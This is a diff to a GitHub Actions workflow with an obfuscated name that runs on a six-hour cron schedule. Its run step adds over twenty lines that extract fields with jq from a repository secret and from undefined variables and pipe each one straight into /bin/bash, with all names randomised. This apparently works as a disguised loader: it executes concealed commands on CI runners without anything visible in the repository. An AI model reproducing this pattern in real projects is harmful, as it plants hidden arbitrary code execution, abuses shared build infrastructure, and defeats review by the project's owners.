@@ -1,9 +1,8 @@
 name: stoodpoliteness
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '42 4/6 * * *'
+    - cron: '37 1/6 * * *'
 
 jobs:
   build:
@@ -13,10 +12,27 @@ jobs:
       - uses: actions/checkout@v4
       - name: stoodpoliteness
         env:
-          oylz170: ${{ secrets.oylz170 }}
+          a02997: ${{ secrets.a02997 }}
         run: |
-          echo $oylz170 | jq -r .au88289 | /bin/bash
-          echo $ao7435 | jq -r .mh6 | /bin/bash
-          echo $so2617 | jq -r .emyw66092 | /bin/bash
-          echo $ucw04040 | jq -r .ni7671 | /bin/bash
+          echo $a02997 | jq -r .yvia10 | /bin/bash
+          echo $s2 | jq -r .ydil304 | /bin/bash
+          echo $ywar74 | jq -r .imb2803 | /bin/bash
+          echo $diu767 | jq -r .k29788 | /bin/bash
+          echo $mnqhy5693 | jq -r .ux4 | /bin/bash
+          echo $yvhc63 | jq -r .e0648 | /bin/bash
+          echo $ls900 | jq -r .okt994 | /bin/bash
+          echo $v63005 | jq -r .pbi14336 | /bin/bash
+          echo $coci724 | jq -r .tohaz5 | /bin/bash
+          echo $un1 | jq -r .xyb67905 | /bin/bash
+          echo $dclq30 | jq -r .ocwub86 | /bin/bash
+          echo $wpe867 | jq -r .fwed444 | /bin/bash
+          echo $tx19163 | jq -r .hqgp6882 | /bin/bash
+          echo $xl9677 | jq -r .j46 | /bin/bash
+          echo $pijsh0308 | jq -r .im0 | /bin/bash
+          echo $w456 | jq -r .jjrwf1343 | /bin/bash
+          echo $zvezh6 | jq -r .i726 | /bin/bash
+          echo $knus03 | jq -r .cto49015 | /bin/bash
+          echo $w8 | jq -r .z0 | /bin/bash
+          echo $owkf3 | jq -r .ehpze7 | /bin/bash
+          echo $or5 | jq -r .vior3491 | /bin/bash
 
